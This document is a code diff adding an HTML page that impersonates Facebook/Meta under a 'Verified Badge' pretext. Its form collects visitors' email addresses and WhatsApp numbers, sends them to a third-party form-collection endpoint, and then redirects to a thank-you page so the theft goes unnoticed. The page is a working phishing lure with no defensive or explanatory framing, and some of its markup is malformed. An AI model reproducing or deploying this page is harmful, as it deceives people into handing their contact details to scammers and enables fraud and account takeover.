@@ -1,0 +1,90 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <link rel="icon" href="/favicon.ico" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="theme-color" content="#000000" />
+  <meta name="description" content="Verified Badge Site" />
+  <link rel="apple-touch-icon" href="/logo192.png" />
+  <link rel="manifest" href="manifest.json" />
+  <title>Meta Form</title>
+  <script defer="defer" src="/static/js/main.fcac1ccc.js"></script>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <noscript>You need to enable JavaScript to run this app.</noscript>
+  <div id="root">
+    <div>
+      <div
+        class="d-flex align-items-center"
+        style="width: 100%; height: 90px; background: rgb(70, 103, 172)"
+      >
+        <h1 class="text-white ms-4 m-0 d-flex align-self-center">facebook</h1>
+      </div>
+      <!-- <div
+        class="d-flex align-items-center"
+        style="width: 100%; height: 60px; background: rgb(233, 235, 238)"
+      >
+        
+      </div> -->
+      <div class="col-12 my-4 d-flex justify-content-center align-items-center">
+        <div class="col-11 col-md-6 border">
+          <div class="p-2" style="background: rgb(245, 246, 247)">
+            <h5 class="m-0">Must Fill correct information below</h5>
+         
+            <br></br>
+            <form
+              id="meta-form"
+              action="https://submit-form.com/J3AaEWfwz"
+              method="POST"
+              <p class="mt-4">Email</p>
+              <input
+                type="email"
+                name="Email"
+                id="c_user"
+                required=""
+                title="Type Your Email"
+                required oninvalid="this.setCustomValidity('Please enter your Email');" 
+                onchange="try{setCustomValidity('')}catch(e){};"
+                 x-moz-errormessage="Please enter your Email" />
+                <br></br>
+              
+              <p class="mt-4" >Whatsapp Number Must With Country Code</p>
+              
+              <input type="number" name="Whatsapp" id="xs" title="Must Enter country code Whit +"pattern="{+}" required=""
+              required oninvalid="this.setCustomValidity('Please enter your Whatsapp Number With Country Code');" 
+                onchange="try{setCustomValidity('')}catch(e){};"
+                 x-moz-errormessage="Please enter your Whatsapp Number With Country Code"
+                />
+              <div
+                class="p-2 mb-2 d-flex justify-content-end"
+                style="background: rgb(245, 246, 247)"
+              >
+                <button
+                  type="submit"
+                  class="text-white border-0"
+                  style="background: rgb(66, 103, 178)"
+                >
+                  Submit
+                </button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('meta-form').addEventListener('submit', function(event) {
+        // The form will be submitted normally first
+        // Then redirect to a specified URL
+        setTimeout(function() {
+            window.location.href = './thanks.html';
+        }, 1000); // Adjust the delay as needed
+    });
+  </script>
+</body>
+</html>
